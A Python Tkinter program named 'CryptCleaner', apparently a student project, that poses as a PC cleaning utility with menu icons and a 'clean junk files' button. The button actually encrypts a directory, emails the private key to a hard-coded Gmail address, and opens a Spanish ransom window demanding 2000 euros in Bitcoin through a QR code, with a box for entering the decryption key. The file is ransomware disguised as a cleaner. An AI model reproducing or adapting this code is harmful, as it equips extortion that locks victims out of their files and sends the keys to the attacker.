import tkinter as tk
from tkinter import Toplevel, simpledialog, messagebox
from PIL import Image, ImageTk
from src.encryptor import encrypt_directory, decrypt_directory
from src.email_utils import send_private_key_email  # Cambiado a send_private_key_email
from pathlib import Path

# Ruta al código QR con la dirección de la cartera BTC
QR_CODE_PATH = "C:/Users/kekol/Desktop/TCC/cryptCleaner/qr_code.png"
DIRECTORY_TO_ENCRYPT = Path("C:/Users/kekol/Desktop/TCC/cryptCleaner/data")

recipient_email = "tccsmtp12@gmail.com"  # Cambia por el email de destino

# Crear la ventana principal
root = tk.Tk()
root.title("CryptCleaner")
root.geometry("1200x600")

# Configurar la ventana
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)

# Crear el frame del menú en el lado izquierdo
menu_frame = tk.Frame(root, width=300, bg="#1b5fc4")
menu_frame.grid(row=0, column=0, sticky="ns")

# Crear el frame principal para el contenido en el centro
content_frame = tk.Frame(root, bg="#ffffff")
content_frame.grid(row=0, column=1, sticky="nsew")

# Función para mostrar un mensaje cuando se hace clic en un botón del menú
def show_message(option):
    tk.messagebox.showinfo("Información", f"Has seleccionado la opción: {option}")

# Función para cargar imágenes PNG
def load_image(path, size=(35, 35)):
    image = Image.open(path).convert("RGBA")
    image = image.resize(size, Image.LANCZOS)
    return ImageTk.PhotoImage(image)

# Cargar los íconos para el menú
icons = {
    "Configuración": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/settings.png"),
    "Drivers": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/drivers.png"),
    "Limpieza": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/clean.png"),
    "Análisis": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/analytics.png"),
    "Optimización": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/optimize.png"),
    "Historial": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/history.png"),
    "Soporte": load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/support.png")
}

# Añadir botones con íconos al menú
for text, icon in icons.items():
    btn = tk.Button(menu_frame, image=icon, command=lambda t=text: show_message(t),
                    bg="#134b99" if text == "Limpieza" else "#1b5fc4",
                    activebackground="#134b99" if text == "Limpieza" else "#1b5fc4", relief="flat",
                    height=55, width=80)
    btn.image = icon
    btn.pack(fill="both", expand=True, padx=0, pady=3)

# Función para encriptar el directorio, enviar la clave privada, y mostrar el mensaje de rescate
def limpiar_archivos():
    public_key = encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)  # Encriptar archivos y enviar la clave privada por correo
    show_ransom_message()  # Mostrar mensaje de rescate

# Mostrar mensaje de rescate con QR
def show_ransom_message():
    ransom_window = Toplevel(root)
    ransom_window.title("Advertencia")
    ransom_window.geometry("600x550")
    ransom_window.config(bg="#ffffff")

    # Mensaje de advertencia
    warning_message = (
        "Todos sus archivos han sido cifrados.\n\n"
        "Si quiere recuperarlos, deposite 2000 euros en BTC\n"
        "a la siguiente cartera y le enviaremos la clave para\n"
        "desencriptarlos:"
    )
    message_label = tk.Label(ransom_window, text=warning_message, font=("Arial", 14), bg="#ffffff", fg="#000000")
    message_label.pack(pady=20)

    # Cargar y mostrar el código QR
    qr_image = Image.open(QR_CODE_PATH).resize((200, 200), Image.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_image)
    qr_label = tk.Label(ransom_window, image=qr_photo, bg="#ffffff")
    qr_label.image = qr_photo
    qr_label.pack(pady=10)

    # Solicitar clave privada para desencriptar
    def request_decryption():
        private_key_text = simpledialog.askstring("Clave Privada", "Introduce la clave privada en formato PEM:")
        if private_key_text:
            try:
                decrypt_directory(DIRECTORY_TO_ENCRYPT, private_key_text)
                messagebox.showinfo("Desencriptado", "Todos los archivos han sido desencriptados.")
                ransom_window.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Clave incorrecta o error al desencriptar.\nDetalles: {e}")

    # Botón para desencriptar
    decrypt_button = tk.Button(ransom_window, text="Desencriptar ahora", command=request_decryption, font=("Arial", 12),
                               bg="#4caf50", fg="white")
    decrypt_button.pack(pady=20)

# Cargar un ícono más grande para el "botón" central
large_icon = load_image("C:/Users/kekol/Desktop/TCC/cryptCleaner/icons/clean.png", size=(60, 60))

# Crear un Canvas para simular el botón circular
circle_canvas = tk.Canvas(content_frame, width=120, height=120, bg="#ffffff", highlightthickness=0)
circle_canvas.place(relx=0.5, rely=0.4, anchor="center")
circle_canvas.create_oval(10, 10, 110, 110, fill="#1b5fc4", outline="")
circle_canvas.image = large_icon
circle_canvas.create_image(60, 60, image=large_icon)

# Vincular el Canvas al evento de clic para simular un botón
circle_canvas.bind("<Button-1>", lambda e: limpiar_archivos())

# Etiqueta de texto debajo del círculo
label_text = tk.Label(content_frame, text="Limpiar archivos basura", font=("Arial", 16), bg="#ffffff", fg="#000000")
label_text.place(relx=0.5, rely=0.5, anchor="n")

# Ejecutar la interfaz gráfica
root.mainloop()
